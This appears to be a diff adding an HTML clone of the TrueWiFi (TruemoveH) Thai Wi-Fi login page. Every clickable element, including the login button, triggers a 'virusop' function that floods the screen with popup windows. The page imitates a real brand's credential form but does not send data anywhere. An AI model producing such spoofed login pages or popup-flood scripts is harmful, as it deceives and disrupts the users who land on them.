@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>TrueWiFi by TruemoveH</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link href="bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" type="text/css" href="styles.css" />
+    <script src="bootstrap.min.js"></script>
+</head>
+
+<body>
+    <script>
+        function openRandomWindow(url, width, height) {
+            var x = Math.floor(Math.random() * (window.screen.width - width));
+            var y = Math.floor(Math.random() * (window.screen.height - height));
+            window.open(url, '', 'width=' + width + ', height=' + height + ', left=' + x + ', top=' + y);
+        }
+        function virusop() {
+            for (var i = 0; i < 5; i++) {
+                openRandomWindow('https://www.google.com', 500, 500);
+                openRandomWindow('https://www.google.com', 200, 200);
+                openRandomWindow('https://www.google.com', 50, 50);
+            }
+        }
+        </script>
+        
+    <div class="page-container">
+        <div class="header-container">
+            <div class="container">
+                <div class="logo-container">
+                    <a href="" class="header-logo" onclick="virusop()">
+                        <img class="header-logo" src="img/header-logo.png" />
+                    </a>
+                </div>
+                <div class="flag-container flag-header">
+                    <div class="flag-menu">
+                        <a href=""><img src="img/main-flagEN.png" onclick="virusop()"/></a>
+                        <a href=""><img src="img/main-flagTH.png" onclick="virusop()"/></a>
+                        <a href=""><img src="img/main-flagCHN.png" onclick="virusop()"/></a>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <main class="main-bg">
+            <div class="container flex-withBanner">
+                <div class="page-content page-mr">
+                    <div class="main-header">
+                        <h3 class="main-title">เข้าสู่ระบบ</h3>
+                        <div class="flag-container flag-main">
+                            <div class="flag-menu">
+                                <a href=""onclick="virusop()"><img src="img/main-flagEN.png" /></a>
+                        <a href=""onclick="virusop()"><img src="img/main-flagTH.png" /></a>
+                        <a href=""onclick="virusop()"><img src="img/main-flagCHN.png" /></a>
+                            </div>
+                        </div>
+                    </div>
+                    <form name="form" class="input-form" action="" method="GET" id="form">
+                        <div class="input-icon">
+                            <img src="img/login-person.png" />
+                            <input name="username" class="input-txt"
+                                placeholder="หมายเลขทรูมูฟ เอช / ทรูไอดี / ชื่อผู้ใช้งาน" type="text" />
+                        </div>
+
+                        <div class="input-icon">
+                            <img src="img/login-lock.png" />
+                            <input name="password" class="input-txt" placeholder="รหัสผ่าน" type="password" />
+                        </div>
+
+                        <p class="login-subtxt">
+                            ลูกค้าทรูมูฟ เอช รับรหัสผ่าน กด *871*4# ✆ </p>
+                        <button class="login-btn" id="btnsubmit" onclick="virusop()">เข้าสู่ระบบ</button>
+                        <div class="login-link">
+                            <a style="float:left;" href="" class="qr-link" onclick="virusop()">เข้าสู่ระบบด้วยQRCode</a>
+                            <a style="float:right;" href=""
+                                class="login-link" onclick="virusop()">ลืมรหัสผ่าน</a>
+                        </div>
+                    </form>
+                </div>
+                <section class="banner-d">
+                    <div class="banner-container">
+                        <div id="myCarousel-d" class="carousel slide" data-ride="carousel">
+                            <div class="carousel-inner">
+                                <div class="carousel-item active"> <img class="banner-img d-block"
+                                    src="img/20211129bluport_d.jpg">
+                            </div>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+            </div>
+        </main>
+
+
+        <section class="menuPrimary-container">
+            <div class="container menuPrimary-wrapper">
+                <a href="" class="menuPrimary-item menu-noPl"onclick="virusop()">
+                    <img class="menuPrimary-img" src="img/menu-wifi.png" />
+                    <p class="menuPrimary-buywifi">ซื้อแพ็กเกจWiFi ราคาพิเศษ</p>
+                </a>
+                <a href="" class="menuPrimary-item"onclick="virusop()">
+                    <img class="menuPrimary-img" src="img/menu-privilage.png" />
+                    <p class="menuPrimary-title">สิทธิพิเศษ</p>
+                </a>
+                <a href="" class="menuPrimary-item menuPrimary-trueId"onclick="virusop()">
+                    <img class="menuPrimary-img primaryTrueId-img" src="img/menu-trueid.png" />
+                    <p class="menuPrimary-title">บัญชีทรูไอดี</p>
+                </a>
+                <a href="" class="menuPrimary-item"onclick="virusop()">
+                    <img class="menuPrimary-img" src="img/menu-roaming.png" />
+                    <p class="menuPrimary-title">เชื่อมโยงข้ามประเทศ</p>
+                </a>
+                <a href="" class="menuPrimary-item menu-noPr"onclick="virusop()">
+                    <img class="menuPrimary-img" src="img/menu-help.png" />
+                    <p class="menuPrimary-title">ช่วยเหลือ</p>
+                </a>
+            </div>
+        </section>
+
+        <footer class="footer-container">
+            <div class="footer-wrapper">
+                <div class="footer-icon">
+                    <img src="img/tips.png">
+                </div>
+                <div class="footer-text">
+                    <p>เบอร์ทรูมูฟ เอช ของคุณคือ บัญชีทรู ไอดีเพื่อเข้าใช้งาน TrueWiFi และบริการอื่นๆ ของทรูได้<a
+                            href="" onclick="virusop()">คลิก</a>
+                    </p>
+                </div>
+            </div>
+        </footer>
+    </div>
+</body>
+
+</html>
